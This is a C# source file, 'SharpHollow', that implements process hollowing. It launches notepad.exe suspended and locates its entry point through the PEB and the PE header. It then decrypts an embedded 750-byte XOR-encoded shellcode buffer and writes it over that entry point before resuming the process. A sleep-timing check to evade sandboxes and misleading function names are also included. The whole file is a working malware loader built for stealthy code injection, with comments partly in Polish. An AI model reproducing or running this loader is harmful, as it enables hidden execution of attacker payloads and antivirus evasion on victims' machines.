﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace SharpHollow
{
    [ComVisible(true)]
    public class Program
    {
        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }



        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);


        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess,
        int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i = 0; i < e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i % key_bytes.Length]);
            }


            return d_buf;
        }

        public static void amireal()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            else
            {
                run();
            }
        }

        public static void run()
        {
            // Create suspended process
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\system32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine(pi.dwProcessId);


            // Use ZwQueryInformationprocess to get PEB to read BASE ADDRESS of the process at offset 0x10 in PEB
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            // Get Pointer to base address of executable at offset 10 bytes from PEB
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // Read base address from pointer 
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            Console.WriteLine(addrBuf);

            IntPtr processBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            Console.WriteLine(processBase);

            // Nastepnie czytamy sobie z tego base addressu 200 bajtow danych

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, processBase, data, data.Length, out nRead);

            // Wyciagamy z danych na offsecie 3C offset gdzie znaduje sie PE Header. 
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            // Nastepnie z PE Headeru na offsecie 28 znajduje sie informacja o RVA (relative virtual address) Entry Pointa. 
            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            // Address entrypointa to po prostu dodanie RVA do processBase
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)processBase);

            byte[] buf = new byte[750] {0x8f,0x21,0xe6,0x89,0x91,0x86,
0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x3e,0x3b,0x58,
0xb7,0x08,0x29,0xe5,0x39,0x0f,0x3b,0xe2,0x37,0x75,0x29,0xe5,
0x39,0x4f,0x25,0x24,0x54,0xa4,0x29,0x61,0xdc,0x25,0x39,0x21,
0xee,0x1f,0x31,0x26,0x5a,0xaf,0xdf,0x55,0x04,0x11,0x63,0x42,
0x4b,0x2e,0xb2,0xa0,0x68,0x2c,0x60,0xaf,0x89,0x82,0x21,0x21,
0xee,0x3f,0x41,0xe5,0x29,0x53,0x3b,0x68,0xb5,0x2c,0x30,0x08,
0xea,0x17,0x6b,0x62,0x67,0x62,0xe4,0x1c,0x6b,0x6f,0x73,0xe2,
0xe5,0xe5,0x61,0x6e,0x6b,0x27,0xf6,0xa9,0x11,0x0a,0x29,0x6f,
0xbb,0x2b,0xf8,0x29,0x45,0x3d,0xea,0x26,0x73,0x26,0x72,0xb9,
0x86,0x3b,0x2c,0x5f,0xa2,0x27,0x8c,0xa0,0x24,0xe6,0x55,0xe6,
0x23,0x6e,0xa5,0x21,0x54,0xad,0xcd,0x2f,0xaa,0xa6,0x7e,0x28,
0x64,0xac,0x59,0x8e,0x1e,0x9e,0x3f,0x6a,0x29,0x49,0x69,0x2b,
0x52,0xbe,0x06,0xb1,0x3d,0x29,0xea,0x2e,0x4f,0x26,0x72,0xb9,
0x03,0x2c,0xea,0x62,0x23,0x2b,0xf8,0x29,0x79,0x24,0x60,0xbe,
0x2a,0xe4,0x77,0xe1,0x24,0x35,0x29,0x6f,0xbb,0x2e,0x2b,0x37,
0x3c,0x37,0x20,0x36,0x2a,0x36,0x32,0x33,0x2d,0xee,0x8d,0x4e,
0x2a,0x3d,0x8c,0x89,0x3d,0x2c,0x38,0x34,0x23,0xe4,0x61,0x80,
0x2e,0x92,0x9e,0x91,0x36,0x27,0x42,0xb2,0x36,0x24,0xdf,0x19,
0x02,0x01,0x1a,0x07,0x00,0x19,0x61,0x2f,0x3d,0x27,0xfa,0x88,
0x2c,0xaa,0xa3,0x22,0x1c,0x49,0x74,0x96,0xb0,0x3e,0x32,0x26,
0xe2,0x8e,0x20,0x33,0x28,0x5c,0xa1,0x23,0x5a,0xa6,0x20,0x3a,
0x2c,0xd7,0x5b,0x38,0x12,0xc8,0x73,0x69,0x65,0x6d,0x9e,0xbb,
0x83,0x7f,0x73,0x69,0x65,0x5c,0x58,0x5c,0x45,0x5e,0x45,0x51,
0x4b,0x5c,0x53,0x57,0x45,0x5e,0x47,0x5a,0x65,0x37,0x29,0xe7,
0xaa,0x26,0xb4,0xa9,0xf5,0x72,0x61,0x6e,0x26,0x5e,0xba,0x3a,
0x36,0x07,0x62,0x3d,0x22,0xd5,0x24,0xe0,0xfa,0xab,0x61,0x6e,
0x6b,0x6f,0x8c,0xbc,0x8d,0x88,0x61,0x6e,0x6b,0x40,0x3b,0x5c,
0x21,0x2a,0x58,0x1e,0x34,0x57,0x21,0x23,0x3f,0x1c,0x31,0x39,
0x18,0x30,0x37,0x5f,0x13,0x34,0x55,0x09,0x27,0x24,0x2b,0x08,
0x30,0x32,0x2f,0x37,0x26,0x02,0x1d,0x51,0x26,0x5a,0x3e,0x56,
0x2d,0x09,0x00,0x50,0x02,0x58,0x39,0x3f,0x3f,0x15,0x3e,0x44,
0x07,0x27,0x53,0x03,0x00,0x25,0x05,0x58,0x03,0x59,0x2c,0x27,
0x02,0x0c,0x3f,0x07,0x51,0x28,0x27,0x3a,0x2f,0x1e,0x27,0x07,
0x21,0x5d,0x1b,0x1a,0x19,0x19,0x01,0x13,0x16,0x40,0x10,0x28,
0x46,0x19,0x36,0x1c,0x5c,0x1b,0x55,0x2b,0x02,0x29,0x26,0x1d,
0x50,0x35,0x51,0x00,0x07,0x36,0x45,0x2d,0x3f,0x5e,0x28,0x0f,
0x5d,0x16,0x31,0x38,0x35,0x06,0x54,0x03,0x0a,0x39,0x2b,0x5b,
0x0a,0x15,0x22,0x21,0x1d,0x23,0x37,0x3b,0x1c,0x20,0x0e,0x09,
0x00,0x06,0x40,0x23,0x15,0x5d,0x14,0x0d,0x18,0x19,0x1b,0x00,
0x08,0x1d,0x14,0x26,0x2f,0x5c,0x12,0x2a,0x0e,0x3f,0x3b,0x23,
0x5e,0x21,0x30,0x0a,0x04,0x3d,0x2d,0x1d,0x53,0x26,0x2a,0x59,
0x35,0x0c,0x53,0x1c,0x5e,0x3e,0x1a,0x58,0x14,0x2e,0x33,0x58,
0x39,0x02,0x34,0x02,0x04,0x5e,0x0b,0x37,0x0d,0x0c,0x19,0x30,
0x0b,0x05,0x07,0x05,0x3f,0x36,0x04,0x06,0x02,0x08,0x34,0x58,
0x12,0x2b,0x22,0x5f,0x29,0x06,0x59,0x37,0x2f,0x3e,0x1e,0x10,
0x37,0x3b,0x05,0x14,0x2d,0x5b,0x0a,0x2e,0x31,0x6d,0x29,0xe7,
0xaa,0x3c,0x29,0x28,0x3d,0x20,0x50,0xa7,0x38,0x27,0xcb,0x69,
0x67,0x45,0xe5,0x6e,0x6b,0x6f,0x73,0x39,0x36,0x3e,0x28,0xa9,
0xa9,0x84,0x26,0x47,0x5e,0x92,0xb4,0x26,0xe2,0xa9,0x19,0x63,
0x3a,0x3e,0x3b,0x26,0xe2,0x9e,0x3e,0x58,0xac,0x20,0x50,0xa7,
0x38,0x3c,0x3a,0xae,0xa7,0x40,0x67,0x76,0x10,0x90,0xa6,0xec,
0xa5,0x18,0x7e,0x26,0xac,0xae,0xfb,0x7a,0x65,0x6d,0x28,0xd4,
0x2f,0x9f,0x46,0x89,0x65,0x6d,0x61,0x6e,0x94,0xba,0x3b,0x96,
0xaa,0x19,0x63,0x85,0xa7,0x87,0x26,0x69,0x65,0x6d,0x32,0x37,
0x01,0x2f,0x29,0x20,0xec,0xbc,0xa0,0x8c,0x7b,0x26,0xb4,0xa9,
0x65,0x7d,0x61,0x6e,0x22,0xd5,0x2b,0xcd,0x36,0x88,0x61,0x6e,
0x6b,0x6f,0x8c,0xbc,0x2d,0xfe,0x32,0x3d,0x23,0xe6,0x94,0x21,
0xec,0x9c,0x29,0xe7,0xb1,0x26,0xb4,0xa9,0x65,0x4d,0x61,0x6e,
0x22,0xe6,0x8a,0x20,0xdf,0x7f,0xf7,0xe7,0x89,0x6f,0x73,0x69,
0x65,0x92,0xb4,0x26,0xe8,0xab,0x53,0xec,0xa5,0x19,0xd3,0x08,
0xe0,0x68,0x3b,0x68,0xa6,0xe8,0xa1,0x1b,0xb9,0x37,0xb0,0x31,
0x0f,0x6d,0x38,0x27,0xac,0xad,0x83,0xdc,0xc7,0x3b,0x9e,0xbb
};

            buf = helloworld(buf, "siemanko");

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);

        }

        static void Main(string[] args)
        {
       
            amireal();
        }
    }
}
